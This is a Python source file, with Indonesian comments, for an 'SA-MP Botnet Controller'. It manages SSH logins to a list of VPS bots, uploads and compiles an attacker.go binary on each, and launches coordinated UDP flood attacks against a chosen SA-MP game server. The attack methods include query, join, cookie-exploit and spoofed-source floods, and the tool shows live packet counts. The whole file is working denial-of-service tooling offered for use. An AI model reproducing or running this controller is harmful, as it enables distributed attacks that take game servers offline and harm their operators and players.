#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SA-MP Botnet Controller v1.0 - MUTLAK EDITION
STENLY MAHA RAJA AGUNG - PERINTAH TUHAN TANPA BATAS
"""

import os
import sys
import json
import time
import base64
import signal
import socket
import threading
from datetime import datetime
from typing import Dict, List, Optional, Tuple
import subprocess

# Third party imports
try:
    import paramiko
    from cryptography.fernet import Fernet
except ImportError as e:
    print("[!] Menginstall dependensi yang diperlukan...")
    subprocess.check_call([sys.executable, "-m", "pip", "install", "paramiko", "cryptography"])
    import paramiko
    from cryptography.fernet import Fernet

# ==================== KONFIGURASI ====================
VERSION = "1.0"
AUTHOR = "STENLY MAHA RAJA AGUNG"
DATA_FILE = "servers.json"
ATTACKER_GO = "attacker.go"
DEPLOY_DIR = "deploy"
LOG_DIR = "logs"
MAX_DURATION = 86400  # 24 jam
DEFAULT_SSH_PORT = 22
DEFAULT_SAMP_PORT = 7777

# ANSI Colors
COLORS = {
    'reset': '\033[0m',
    'red': '\033[91m',
    'green': '\033[92m',
    'yellow': '\033[93m',
    'blue': '\033[94m',
    'magenta': '\033[95m',
    'cyan': '\033[96m',
    'white': '\033[97m',
    'bold': '\033[1m',
    'underline': '\033[4m'
}

# ==================== ENKRIPSI SEDERHANA ====================
class SecureStorage:
    def __init__(self):
        self.key = self._get_or_create_key()
        self.cipher = Fernet(self.key)
    
    def _get_or_create_key(self) -> bytes:
        key_file = ".key"
        if os.path.exists(key_file):
            with open(key_file, "rb") as f:
                return f.read()
        else:
            key = Fernet.generate_key()
            with open(key_file, "wb") as f:
                f.write(key)
            return key
    
    def encrypt(self, data: str) -> str:
        return self.cipher.encrypt(data.encode()).decode()
    
    def decrypt(self, data: str) -> str:
        return self.cipher.decrypt(data.encode()).decode()

# ==================== MANAJEMEN SERVER ====================
class ServerManager:
    def __init__(self):
        self.secure = SecureStorage()
        self.servers = self._load_servers()
        self.ssh_clients = {}  # cache SSH connections
    
    def _load_servers(self) -> List[Dict]:
        if os.path.exists(DATA_FILE):
            try:
                with open(DATA_FILE, 'r') as f:
                    return json.load(f)
            except:
                return []
        return []
    
    def _save_servers(self):
        with open(DATA_FILE, 'w') as f:
            json.dump(self.servers, f, indent=4)
    
    def add_server(self, ip: str, port: int, username: str, password: str):
        encrypted_pass = self.secure.encrypt(password)
        server = {
            "ip": ip,
            "port": port,
            "username": username,
            "password": encrypted_pass
        }
        self.servers.append(server)
        self._save_servers()
        return len(self.servers) - 1
    
    def remove_server(self, index: int):
        if 0 <= index < len(self.servers):
            removed = self.servers.pop(index)
            self._save_servers()
            # Hapus dari cache koneksi
            key = f"{removed['ip']}:{removed['port']}"
            if key in self.ssh_clients:
                try:
                    self.ssh_clients[key].close()
                except:
                    pass
                del self.ssh_clients[key]
            return True
        return False
    
    def get_server(self, index: int) -> Optional[Dict]:
        if 0 <= index < len(self.servers):
            server = self.servers[index].copy()
            server['password'] = self.secure.decrypt(server['password'])
            return server
        return None
    
    def get_all_servers(self) -> List[Dict]:
        servers = []
        for s in self.servers:
            try:
                server_copy = s.copy()
                server_copy['password'] = self.secure.decrypt(server_copy['password'])
                servers.append(server_copy)
            except:
                # Skip jika gagal decrypt
                continue
        return servers
    
    def get_ssh_client(self, server: Dict) -> Optional[paramiko.SSHClient]:
        key = f"{server['ip']}:{server['port']}"
        
        # Cek cache
        if key in self.ssh_clients:
            client = self.ssh_clients[key]
            # Test koneksi
            try:
                client.exec_command('echo 1', timeout=5)
                return client
            except:
                pass
        
        # Buat koneksi baru
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(
                server['ip'],
                port=server['port'],
                username=server['username'],
                password=server['password'],
                timeout=10,
                allow_agent=False,
                look_for_keys=False
            )
            self.ssh_clients[key] = client
            return client
        except Exception as e:
            print(f"{COLORS['red']}[!] Gagal konek ke {server['ip']}: {e}{COLORS['reset']}")
            return None

# ==================== UI FUNCTIONS ====================
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    banner = f"""
{COLORS['red']}{COLORS['bold']}
╔══════════════════════════════════════════════════════════╗
║     SA-MP BOTNET CONTROLLER - MUTLAK EDITION v{VERSION}          ║
║            STENLY MAHA RAJA AGUNG - TUHAN TERTINGGI       ║
╚══════════════════════════════════════════════════════════╝
{COLORS['reset']}
"""
    print(banner)

def print_menu():
    menu = f"""
{COLORS['cyan']}{COLORS['bold']}MENU UTAMA:{COLORS['reset']}
{COLORS['yellow']}[1]{COLORS['reset']} Tambah VPS/Bot baru
{COLORS['yellow']}[2]{COLORS['reset']} Lihat daftar VPS/Bot
{COLORS['yellow']}[3]{COLORS['reset']} Hapus VPS/Bot
{COLORS['yellow']}[4]{COLORS['reset']} Cek & Deploy binary ke semua VPS
{COLORS['yellow']}[5]{COLORS['reset']} Mulai Serangan
{COLORS['yellow']}[6]{COLORS['reset']} Stop Serangan
{COLORS['yellow']}[7]{COLORS['reset']} Keluar
"""
    print(menu)

def print_servers_table(servers: List[Dict], manager: ServerManager):
    if not servers:
        print(f"{COLORS['red']}Tidak ada VPS terdaftar.{COLORS['reset']}")
        return
    
    print(f"\n{COLORS['bold']}{COLORS['cyan']}DAFTAR VPS/BOT:{COLORS['reset']}")
    print(f"{COLORS['bold']}{'No':<4} {'IP':<16} {'Port':<6} {'Username':<15} {'SSH':<8} {'Attacker':<10}{COLORS['reset']}")
    print("-" * 70)
    
    for i, server in enumerate(servers):
        # Cek status SSH
        ssh_status = f"{COLORS['green']}OK{COLORS['reset']}"
        client = manager.get_ssh_client(server)
        if not client:
            ssh_status = f"{COLORS['red']}Failed{COLORS['reset']}"
        
        # Cek status attacker
        attacker_status = f"{COLORS['yellow']}Unknown{COLORS['reset']}"
        if client:
            try:
                stdin, stdout, stderr = client.exec_command('if [ -f ./attacker ]; then echo "Ada"; else echo "Tidak Ada"; fi', timeout=5)
                result = stdout.read().decode().strip()
                if result == "Ada":
                    # Cek executable
                    stdin2, stdout2, stderr2 = client.exec_command('[ -x ./attacker ] && echo "Executable" || echo "Not Executable"', timeout=5)
                    exec_status = stdout2.read().decode().strip()
                    if exec_status == "Executable":
                        attacker_status = f"{COLORS['green']}Ada{COLORS['reset']}"
                    else:
                        attacker_status = f"{COLORS['red']}Not Exec{COLORS['reset']}"
                else:
                    attacker_status = f"{COLORS['red']}Tidak Ada{COLORS['reset']}"
            except:
                attacker_status = f"{COLORS['red']}Error{COLORS['reset']}"
        
        print(f"{i:<4} {server['ip']:<16} {server['port']:<6} {server['username']:<15} {ssh_status}    {attacker_status}")

# ==================== DEPLOY FUNCTIONS ====================
def deploy_to_server(server: Dict, manager: ServerManager) -> Tuple[bool, str]:
    """Deploy attacker.go ke server dan compile"""
    client = manager.get_ssh_client(server)
    if not client:
        return False, "SSH connection failed"
    
    try:
        # Cek apakah Go terinstall
        stdin, stdout, stderr = client.exec_command('go version', timeout=10)
        go_version = stdout.read().decode().strip()
        if not go_version:
            return False, "Go tidak terinstall di server"
        
        # Upload attacker.go
        sftp = client.open_sftp()
        local_path = ATTACKER_GO
        remote_path = "attacker.go"
        
        # Upload file
        sftp.put(local_path, remote_path)
        sftp.close()
        
        # Compile
        compile_cmd = 'GOOS=linux GOARCH=amd64 go build -ldflags "-s -w" -o attacker attacker.go'
        stdin, stdout, stderr = client.exec_command(compile_cmd, timeout=60)
        exit_status = stdout.channel.recv_exit_status()
        
        if exit_status != 0:
            error = stderr.read().decode()
            return False, f"Compile error: {error[:100]}"
        
        # Set executable
        client.exec_command('chmod +x ./attacker', timeout=5)
        
        return True, "Deploy sukses"
    except Exception as e:
        return False, f"Error: {str(e)}"

def deploy_to_all(manager: ServerManager) -> List[Dict]:
    """Deploy ke semua server"""
    servers = manager.get_all_servers()
    results = []
    
    print(f"{COLORS['cyan']}Memulai deploy ke {len(servers)} server...{COLORS['reset']}")
    
    for i, server in enumerate(servers):
        print(f"{COLORS['yellow']}[{i+1}/{len(servers)}] Deploy ke {server['ip']}...{COLORS['reset']}", end="", flush=True)
        success, message = deploy_to_server(server, manager)
        
        if success:
            print(f"\r{COLORS['green']}[{i+1}/{len(servers)}] {server['ip']}: {message}{COLORS['reset']}")
        else:
            print(f"\r{COLORS['red']}[{i+1}/{len(servers)}] {server['ip']}: {message}{COLORS['reset']}")
        
        results.append({
            "ip": server['ip'],
            "success": success,
            "message": message
        })
    
    return results

# ==================== ATTACK FUNCTIONS ====================
class AttackManager:
    def __init__(self, manager: ServerManager):
        self.manager = manager
        self.active_bots = {}  # {ip: process_stdin}
        self.attack_active = False
        self.monitor_thread = None
        self.stats = {
            'total_packets': 0,
            'start_time': None,
            'bots': {}
        }
    
    def start_attack(self, target: str, method: str, duration: int, 
                     goroutines: int, rate: int, selected_servers: List[Dict]):
        """Mulai serangan pada server terpilih"""
        self.attack_active = True
        self.stats['start_time'] = time.time()
        self.stats['total_packets'] = 0
        
        cmd = f"./attacker --target={target} --method={method} --duration={duration} --goroutines={goroutines} --rate={rate}"
        
        print(f"{COLORS['cyan']}Memulai serangan ke {target} dengan metode {method}...{COLORS['reset']}")
        
        for server in selected_servers:
            try:
                client = self.manager.get_ssh_client(server)
                if not client:
                    continue
                
                # Execute in background
                transport = client.get_transport()
                session = transport.open_session()
                session.exec_command(cmd)
                
                self.active_bots[server['ip']] = session
                self.stats['bots'][server['ip']] = {
                    'packets': 0,
                    'status': 'running'
                }
                
                print(f"{COLORS['green']}[+] Bot {server['ip']} aktif{COLORS['reset']}")
            except Exception as e:
                print(f"{COLORS['red']}[-] Gagal start bot {server['ip']}: {e}{COLORS['reset']}")
        
        # Start monitor thread
        self.monitor_thread = threading.Thread(target=self._monitor_attack, args=(duration,))
        self.monitor_thread.daemon = True
        self.monitor_thread.start()
    
    def _monitor_attack(self, duration: int):
        """Monitor real-time serangan"""
        end_time = time.time() + duration
        
        while self.attack_active and time.time() < end_time:
            time.sleep(5)
            
            # Update stats dari setiap bot
            for ip, session in list(self.active_bots.items()):
                try:
                    if session.exit_status_ready():
                        self.stats['bots'][ip]['status'] = 'stopped'
                    else:
                        # Baca output jika ada
                        if session.recv_ready():
                            output = session.recv(1024).decode()
                            # Parse packet count dari output
                            # Asumsi attacker.go output: "Sent X packets"
                            import re
                            match = re.search(r'Sent (\d+) packets', output)
                            if match:
                                packets = int(match.group(1))
                                self.stats['bots'][ip]['packets'] = packets
                except:
                    self.stats['bots'][ip]['status'] = 'error'
            
            # Hitung total
            total = sum(b['packets'] for b in self.stats['bots'].values())
            self.stats['total_packets'] = total
            
            # Clear and print stats
            clear_screen()
            print_banner()
            print(f"{COLORS['bold']}{COLORS['red']}🔥 SERANGAN BERLANGSUNG 🔥{COLORS['reset']}")
            print(f"Target: {target_ip}:{target_port}")
            print(f"Metode: {method_name}")
            print(f"Sisa Waktu: {int(end_time - time.time())} detik")
            print(f"Total Paket: {total:,}")
            print(f"\n{COLORS['cyan']}Status per Bot:{COLORS['reset']}")
            
            for ip, data in self.stats['bots'].items():
                status_color = COLORS['green'] if data['status'] == 'running' else COLORS['red']
                print(f"  {ip}: {status_color}{data['status']}{COLORS['reset']} - {data['packets']:,} paket")
    
    def stop_attack(self):
        """Hentikan semua serangan"""
        self.attack_active = False
        
        for ip, session in self.active_bots.items():
            try:
                session.close()
            except:
                pass
        
        self.active_bots = {}
        
        # Juga kirim kill command ke semua server
        servers = self.manager.get_all_servers()
        for server in servers:
            try:
                client = self.manager.get_ssh_client(server)
                if client:
                    client.exec_command('pkill -f attacker', timeout=5)
            except:
                pass
        
        print(f"{COLORS['green']}[+] Semua serangan dihentikan{COLORS['reset']}")

# ==================== MAIN PROGRAM ====================
def main():
    # Setup direktori
    os.makedirs(DEPLOY_DIR, exist_ok=True)
    os.makedirs(LOG_DIR, exist_ok=True)
    
    manager = ServerManager()
    attack_mgr = AttackManager(manager)
    
    # Global variables untuk input serangan
    global target_ip, target_port, method_name
    
    while True:
        clear_screen()
        print_banner()
        print_menu()
        
        choice = input(f"{COLORS['bold']}{COLORS['cyan']}Pilih menu [1-7]: {COLORS['reset']}").strip()
        
        if choice == '1':  # Tambah VPS
            print(f"\n{COLORS['bold']}TAMBAH VPS BARU{COLORS['reset']}")
            ip = input("IP VPS: ").strip()
            port = input(f"Port SSH [22]: ").strip()
            port = int(port) if port else 22
            username = input("Username SSH: ").strip()
            password = input("Password SSH: ").strip()
            
            if ip and username and password:
                manager.add_server(ip, port, username, password)
                print(f"{COLORS['green']}[+] VPS {ip} ditambahkan!{COLORS['reset']}")
            else:
                print(f"{COLORS['red']}[!] Data tidak lengkap{COLORS['reset']}")
            
            input("\nTekan Enter untuk lanjut...")
        
        elif choice == '2':  # Lihat daftar
            servers = manager.get_all_servers()
            print_servers_table(servers, manager)
            input("\nTekan Enter untuk lanjut...")
        
        elif choice == '3':  # Hapus VPS
            servers = manager.get_all_servers()
            if not servers:
                print(f"{COLORS['red']}Tidak ada VPS{COLORS['reset']}")
                input("Tekan Enter...")
                continue
            
            print_servers_table(servers, manager)
            try:
                idx = int(input(f"\n{COLORS['yellow']}Nomor VPS yang dihapus: {COLORS['reset']}"))
                if manager.remove_server(idx):
                    print(f"{COLORS['green']}[+] VPS dihapus{COLORS['reset']}")
                else:
                    print(f"{COLORS['red']}[!] Nomor tidak valid{COLORS['reset']}")
            except:
                print(f"{COLORS['red']}[!] Input tidak valid{COLORS['reset']}")
            
            input("\nTekan Enter...")
        
        elif choice == '4':  # Deploy
            if not os.path.exists(ATTACKER_GO):
                print(f"{COLORS['red']}[!] File {ATTACKER_GO} tidak ditemukan!{COLORS['reset']}")
                print(f"Buat file {ATTACKER_GO} terlebih dahulu.")
                input("Tekan Enter...")
                continue
            
            results = deploy_to_all(manager)
            
            # Ringkasan
            success_count = sum(1 for r in results if r['success'])
            print(f"\n{COLORS['bold']}Ringkasan Deploy:{COLORS['reset']}")
            print(f"Sukses: {COLORS['green']}{success_count}{COLORS['reset']}")
            print(f"Gagal: {COLORS['red']}{len(results)-success_count}{COLORS['reset']}")
            
            input("\nTekan Enter untuk lanjut...")
        
        elif choice == '5':  # Mulai serangan
            servers = manager.get_all_servers()
            if not servers:
                print(f"{COLORS['red']}Tidak ada VPS terdaftar!{COLORS['reset']}")
                input("Tekan Enter...")
                continue
            
            print(f"\n{COLORS['bold']}{COLORS['red']}🔥 PERSIAPAN SERANGAN 🔥{COLORS['reset']}")
            
            # Input parameter bertahap
            target_ip = input("Masukkan IP target SA-MP: ").strip()
            if not target_ip:
                print(f"{COLORS['red']}IP wajib diisi!{COLORS['reset']}")
                input("Tekan Enter...")
                continue
            
            port_input = input(f"Masukkan Port target [7777]: ").strip()
            target_port = int(port_input) if port_input else 7777
            
            # Pilih metode
            print(f"\n{COLORS['cyan']}Pilih Metode Serangan:{COLORS['reset']}")
            methods = [
                "queryflood (flood paket query SA-MP)",
                "joinflood (banjir fake connection)",
                "cookieflood (exploit cookie 0.3.7)",
                "udp_samp_flood (payload besar custom)",
                "spoofed_udp_flood (UDP spoofed source)",
                "generic_udp_flood (UDP random)"
            ]
            
            for i, m in enumerate(methods, 1):
                print(f"{COLORS['yellow']}[{i}]{COLORS['reset']} {m}")
            
            try:
                method_choice = int(input("Pilih nomor metode [1-6]: "))
                if 1 <= method_choice <= 6:
                    method_map = {
                        1: "queryflood",
                        2: "joinflood", 
                        3: "cookieflood",
                        4: "udp_samp_flood",
                        5: "spoofed_udp_flood",
                        6: "generic_udp_flood"
                    }
                    method_name = method_map[method_choice]
                else:
                    print(f"{COLORS['red']}Pilihan tidak valid{COLORS['reset']}")
                    input("Tekan Enter...")
                    continue
            except:
                print(f"{COLORS['red']}Input tidak valid{COLORS['reset']}")
                input("Tekan Enter...")
                continue
            
            # Durasi
            try:
                duration = int(input(f"Durasi serangan (detik, max {MAX_DURATION}): "))
                if duration > MAX_DURATION:
                    print(f"{COLORS['yellow']}Durasi terlalu besar, diset ke {MAX_DURATION}{COLORS['reset']}")
                    duration = MAX_DURATION
            except:
                print(f"{COLORS['red']}Input tidak valid{COLORS['reset']}")
                input("Tekan Enter...")
                continue
            
            # Goroutines
            try:
                goroutines = int(input("Jumlah goroutines per bot (500-10000): "))
                if goroutines < 1:
                    goroutines = 500
            except:
                goroutines = 500
            
            # Rate limit
            try:
                rate = int(input("Rate limit per bot (packets/s, 0 = unlimited): "))
            except:
                rate = 0
            
            # Pilih server
            print(f"\n{COLORS['cyan']}Daftar VPS tersedia:{COLORS['reset']}")
            print_servers_table(servers, manager)
            
            print(f"\n{COLORS['yellow']}Pilih VPS untuk serangan:{COLORS['reset']}")
            print("1. Semua VPS")
            print("2. Pilih manual (dipisah koma, contoh: 0,2,4)")
            
            server_choice = input("Pilihan: ").strip()
            
            selected_servers = []
            if server_choice == '1':
                selected_servers = servers
            else:
                try:
                    indices = [int(x.strip()) for x in server_choice.split(',')]
                    for idx in indices:
                        server = manager.get_server(idx)
                        if server:
                            selected_servers.append(server)
                except:
                    print(f"{COLORS['red']}Input tidak valid, menggunakan semua VPS{COLORS['reset']}")
                    selected_servers = servers
            
            if not selected_servers:
                print(f"{COLORS['red']}Tidak ada VPS dipilih{COLORS['reset']}")
                input("Tekan Enter...")
                continue
            
            # Konfirmasi
            print(f"\n{COLORS['bold']}{COLORS['red']}RINGKASAN SERANGAN:{COLORS['reset']}")
            print(f"Target: {target_ip}:{target_port}")
            print(f"Metode: {method_name}")
            print(f"Durasi: {duration} detik")
            print(f"Goroutines: {goroutines}")
            print(f"Rate: {'Unlimited' if rate == 0 else rate}")
            print(f"Jumlah Bot: {len(selected_servers)}")
            
            confirm = input(f"\n{COLORS['bold']}{COLORS['red']}KONFIRMASI MULAI SERANGAN? (y/n): {COLORS['reset']}").strip().lower()
            
            if confirm == 'y':
                target = f"{target_ip}:{target_port}"
                attack_mgr.start_attack(target, method_name, duration, goroutines, rate, selected_servers)
                
                # Tunggu serangan selesai (atau user interrupt)
                try:
                    while attack_mgr.attack_active:
                        time.sleep(1)
                except KeyboardInterrupt:
                    print(f"\n{COLORS['yellow']}Menghentikan serangan...{COLORS['reset']}")
                    attack_mgr.stop_attack()
                
                input("\nTekan Enter untuk lanjut...")
            else:
                print(f"{COLORS['yellow']}Serangan dibatalkan{COLORS['reset']}")
                input("Tekan Enter...")
        
        elif choice == '6':  # Stop serangan
            attack_mgr.stop_attack()
            input("Tekan Enter...")
        
        elif choice == '7':  # Keluar
            print(f"{COLORS['yellow']}Menutup semua koneksi...{COLORS['reset']}")
            attack_mgr.stop_attack()
            sys.exit(0)
        
        else:
            print(f"{COLORS['red']}Pilihan tidak valid!{COLORS['reset']}")
            input("Tekan Enter...")

if __name__ == "__main__":
    # Signal handler
    def signal_handler(sig, frame):
        print(f"\n{COLORS['yellow']}Keluar...{COLORS['reset']}")
        sys.exit(0)
    
    signal.signal(signal.SIGINT, signal_handler)
    
    # Cek file attacker.go
    if not os.path.exists(ATTACKER_GO):
        print(f"{COLORS['yellow']}[!] File {ATTACKER_GO} tidak ditemukan.{COLORS['reset']}")
        print(f"Buat file tersebut sebelum menu deploy.")
        print(f"Tekan Enter untuk lanjut...")
        input()
    
    main()
